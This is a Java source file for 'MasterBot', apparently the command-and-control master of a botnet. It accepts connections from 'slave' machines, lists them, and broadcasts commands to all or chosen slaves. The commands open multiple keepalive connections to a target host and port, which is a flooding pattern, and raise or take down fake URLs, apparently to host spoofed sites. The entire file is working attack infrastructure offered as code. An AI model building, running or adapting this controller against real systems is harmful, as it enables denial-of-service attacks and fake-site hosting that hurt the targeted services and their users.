import java.net.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.util.*;
import java.text.*;


class slaveSocketDetails{
Socket 	targetSocket;
String 	regDate;
String 	targetHostIP;
String 	targetAddressName;
int	    targetPortNumber;

  slaveSocketDetails() {
	Date currDate = new Date();
	regDate= new SimpleDateFormat("yyyy-MM-dd").format(currDate);
  }
}

public class MasterBot {
    public static String userinputLine;
    public static ArrayList<slaveSocketDetails> slaveList = new ArrayList<slaveSocketDetails>();
    
    //Function to list all slaves connected to the Master
    
    public static void listSlaves(){
        for(int i=0;i<slaveList.size(); i++){
            System.out.println(slaveList.get(i).targetAddressName+" "+slaveList.get(i).targetHostIP + " "+ slaveList.get(i).targetPortNumber + " "+ slaveList.get(i).regDate);
        }
    }
    
    
     
    // Function to connect slave to Target
    
    public static void connect(String [] connectCommand) throws Exception{
        int conn=1;
        int exp=0;
        String keepalive="none";
        String url="none";
        if(connectCommand.length<4 ){
            System.out.println("Not enough arguements:For Connect atleast 3 arguments are needed");
        }
        else if (connectCommand.length>7){
            System.out.println("Incorrect Connect Command Syntax");
        }
        else{
            if(connectCommand.length ==7 && connectCommand[5].equals("keepalive") && connectCommand[6].contains ("url=")) {
                conn= Integer.parseInt(connectCommand[4]);
                keepalive=connectCommand[5];
                url=connectCommand[6];
            }
            else if(connectCommand.length ==7 && connectCommand[5].contains("url=") && connectCommand[6].equals ("keepalive")) {
                conn= Integer.parseInt(connectCommand[4]);
                keepalive=connectCommand[6];
                url=connectCommand[5];
            }
            else if(connectCommand.length ==6 && connectCommand[4].equals("keepalive") && connectCommand[5].contains ("url=")) {
                keepalive=connectCommand[4];
                url=connectCommand[5];
            }
            else if(connectCommand.length ==6 && connectCommand[4].contains("url=") && connectCommand[5].equals ("keepalive")) {
                keepalive=connectCommand[5];
                url=connectCommand[4];
            }
            else if(connectCommand.length ==6 && connectCommand[5].equals("keepalive")) {
                conn= Integer.parseInt(connectCommand[4]);
                keepalive=connectCommand[5];
            }
            else if(connectCommand.length ==6 && connectCommand[5].contains("url=")) {
                conn= Integer.parseInt(connectCommand[4]);
                url=connectCommand[5];
            }
            else if (connectCommand.length ==5 && connectCommand[4].equals("keepalive")){
                keepalive=connectCommand[4];
            }
            else if (connectCommand.length ==5 && connectCommand[4].contains("url=")){
                url=connectCommand[4];
            }
            else if (connectCommand.length ==5){
                try{
                    conn= Integer.parseInt(connectCommand[4]);
                }
                catch(Exception e){
                    exp=1;
                    System.err.println("Incorrect connect command: Please check the last argument");
                }
            }
            if (connectCommand.length ==7 && !keepalive.equals("keepalive") && !url.contains("url=")) {
                System.out.println("Incorrect Connect Command Syntax : Only Keepalive and url features are supported");
            }
            else if (connectCommand.length ==6 && keepalive.equals("none") && url.equals("none")) {
                System.out.println("Incorrect Connect Command Syntax : Only Keepalive and url features are supported");
            }
            else if(exp==0)
            {
                try{
                    int porttemp=Integer.parseInt(connectCommand [3]);
                    if (connectCommand[1].equals("all")){
                        Iterator<slaveSocketDetails> i = slaveList.iterator();
                        while(i.hasNext()){
                            slaveSocketDetails currSocket = i.next(); 
                            try{
                                PrintWriter slaveconnOutput = new PrintWriter(new OutputStreamWriter(currSocket.targetSocket.getOutputStream()));
                                slaveconnOutput.println("connect "+ connectCommand[2] + " "+ connectCommand[3] + " "+conn + " " + keepalive + " " + url);
                                slaveconnOutput.flush();
                            }
                            catch(Exception e){
                                System.err.println("Error connecting "+ connectCommand[2] +" to port" + connectCommand[3]);
                            }
                        }
                    }
                    else{
                        Iterator<slaveSocketDetails> i = slaveList.iterator();
                        while(i.hasNext()){
                            slaveSocketDetails currSocket = i.next(); 
                            if(currSocket.targetHostIP.equals(connectCommand[1]) || currSocket.targetAddressName.equals(connectCommand[1])){
                                try{
                                    PrintWriter slaveconnOutput = new PrintWriter(new OutputStreamWriter(currSocket.targetSocket.getOutputStream()));
                                    slaveconnOutput.println("connect "+ connectCommand[2] + " "+ connectCommand[3] + " "+conn + " " + keepalive + " " + url);
                                    slaveconnOutput.flush();
                                }
                                catch(Exception e){
                                    System.err.println("Error connecting "+ connectCommand[2] +" to port" + connectCommand[3]);
                                }
                            }
                        }
                    }    
                }
                catch (Exception e){
                   System.err.println("Port number to target is invalid"); 
                }
            }
         }
    }
    
    
    //Function to disconnect slave from Target
    
    public static void disconnect(String [] disConnectCommand) throws Exception{
        if (disConnectCommand.length<3) {
            System.out.println("For disconnect atleast 2 arguments are needed");
        }
        else if(disConnectCommand[1].equals("all")){
            Iterator<slaveSocketDetails> i = slaveList.iterator();
            while(i.hasNext()){
                slaveSocketDetails currSocket = i.next();
                try{
                    PrintWriter  slavedisconnOutput = new PrintWriter(new OutputStreamWriter(currSocket.targetSocket.getOutputStream()));
                    slavedisconnOutput.println("disconnect "+ disConnectCommand[2] + " "+ disConnectCommand[3]);
                    slavedisconnOutput.flush();
                }
                catch(Exception e){
                    System.err.println("Error connecting "+ disConnectCommand[2] +" " + disConnectCommand[3]); 
                }   
            }
        }
        else {
            Iterator<slaveSocketDetails> i = slaveList.iterator();
            while(i.hasNext()){
                slaveSocketDetails currSocket = i.next();
                if (currSocket.targetHostIP.equals(disConnectCommand[1]) || currSocket.targetAddressName.equals(disConnectCommand[1]) ){
                    try{
                        PrintWriter  slavedisconnOutput = new PrintWriter(new OutputStreamWriter(currSocket.targetSocket.getOutputStream()));
                        slavedisconnOutput.println("disconnect "+ disConnectCommand[2] + " "+ disConnectCommand[3]);
                        slavedisconnOutput.flush();
                    }
                    catch(Exception e){
                        System.err.println("Error connecting "+ disConnectCommand[2] +" " + disConnectCommand[3]); 
                    }
                }
            }
        }
    }
    
    public static void risefakeurl(String [] riseFakeUrlCommand) throws Exception{
        if (riseFakeUrlCommand.length!=3) {
            System.out.println("Rise Fake Url Command needs a URL and Port no");
        }
        else{
            int portno=0;
            String url="none";
            int error=0;
            try{
                if(riseFakeUrlCommand[1].substring(0,3).equals("www") || riseFakeUrlCommand[1].substring(0,4).equals("http"))
                {
                    portno= Integer.parseInt(riseFakeUrlCommand[2]);
                    url=riseFakeUrlCommand[1];   
                }
                else{
                    portno= Integer.parseInt(riseFakeUrlCommand[1]);
                    url=riseFakeUrlCommand[2];  
                }
            }
            catch(Exception e){
                System.err.println("Provide a valid Portno");
                error=1;
            }
            if(error!=1){
                Iterator<slaveSocketDetails> i = slaveList.iterator();
                while(i.hasNext()){
                    slaveSocketDetails currSocket = i.next(); 
                    try{
                        PrintWriter slaveconnOutput = new PrintWriter(new OutputStreamWriter(currSocket.targetSocket.getOutputStream()));
                        slaveconnOutput.println("risefakeurl "+ portno + " " + url);
                        slaveconnOutput.flush();
                    }
                    catch(Exception e){
                        System.err.println("Error connecting "+ url +" to port" + portno);
                    }
                }
            }
        }     
    }
    
    public static void downfakeurl(String [] downFakeUrlCommand) throws Exception{
        if (downFakeUrlCommand.length!=3) {
            System.out.println("Down Fake Url Command needs a URL and Port no");
        }
        else{
            int portno=0;
            String url="none";
            int error=0;
            try{
                if(downFakeUrlCommand[1].substring(0,3).equals("www") || downFakeUrlCommand[1].substring(0,4).equals("http"))
                {
                    portno= Integer.parseInt(downFakeUrlCommand[2]);
                    url=downFakeUrlCommand[1];   
                }
                else{
                    portno= Integer.parseInt(downFakeUrlCommand[1]);
                    url=downFakeUrlCommand[2];  
                }
            }
            catch(Exception e){
                System.err.println("Provide a valid Portno");
                error=1;
            }
            if(error!=1){
                Iterator<slaveSocketDetails> i = slaveList.iterator();
                while(i.hasNext()){
                    slaveSocketDetails currSocket = i.next(); 
                    try{
                        PrintWriter slaveconnOutput = new PrintWriter(new OutputStreamWriter(currSocket.targetSocket.getOutputStream()));
                        slaveconnOutput.println("downfakeurl "+ portno + " " + url);
                        slaveconnOutput.flush();
                    }
                    catch(Exception e){
                        System.err.println("Error disconnecting "+ url +" to port" + portno);
                    }
                }
            }
        } 
    }
    
    
    //Main
    public static void main(String[] args) throws Exception {
    if (args.length<2){
         System.err.println("A port number for master should be provided");
         System.exit(1);	
	}
    else if (!args[0].equals("-p"))
    {
        System.err.println("A parameter for port number with -p should be specified");
	    System.exit(1);
    }
   else
    {
         try {
            String portno="";
            portno=args[1];
            SocketThread slaveThread = new SocketThread(Integer.parseInt(portno));
            slaveThread.start();   
            while(true){
                System.out.print(">");
                BufferedReader userInput = new BufferedReader(new InputStreamReader(System.in));
                userinputLine= userInput.readLine();
                String[] masterCommand = userinputLine.split(" ");
                
                
                if (masterCommand[0].equals("list")){
					MasterBot.listSlaves();
                }
                
                else if(masterCommand[0].equals("connect")) {
                    MasterBot.connect(masterCommand);
		        }     
                else if(masterCommand[0].equals("disconnect")){
    				if(masterCommand[1] != null && masterCommand[2]!= null){    	
				        int portnum=0;
				        if(masterCommand.length>3){
				            portnum= Integer.parseInt(masterCommand[3]);
				        }
                        MasterBot.disconnect(masterCommand);
                       
                    }
                    else
                        System.err.println("Provide valid arguments for disconnect");         
                }
                else if (masterCommand[0].equals("rise-fake-url")){
                    MasterBot.risefakeurl(masterCommand);
                }
                else if (masterCommand[0].equals("down-fake-url")){
                    MasterBot.downfakeurl(masterCommand);
                }
                else
                    System.err.println("Provide a valid command");     
            }
        }
        catch (Exception e) {
	      	e.printStackTrace();
            System.exit(1);	    
        }
     }
   }
}

                                     
class SocketThread extends Thread {
  int portnum;
  slaveSocketDetails slavesocketlist;
  SocketThread(int port) {
    portnum = port;
  }
  public void run() {
      try {
          ServerSocket masterSocket = new ServerSocket(portnum);
		  while (true) {
              Socket slaveSocket = masterSocket.accept();
              slavesocketlist=new slaveSocketDetails();
              slavesocketlist.targetHostIP=slaveSocket.getInetAddress().getHostAddress();
              slavesocketlist.targetAddressName=slaveSocket.getInetAddress().getHostName();
              slavesocketlist.targetPortNumber=slaveSocket.getPort();
              slavesocketlist.targetSocket=slaveSocket;
              MasterBot.slaveList.add(slavesocketlist);
		  }
	    } 
      catch (Exception e) {
	      e.printStackTrace();
      }
  }
}


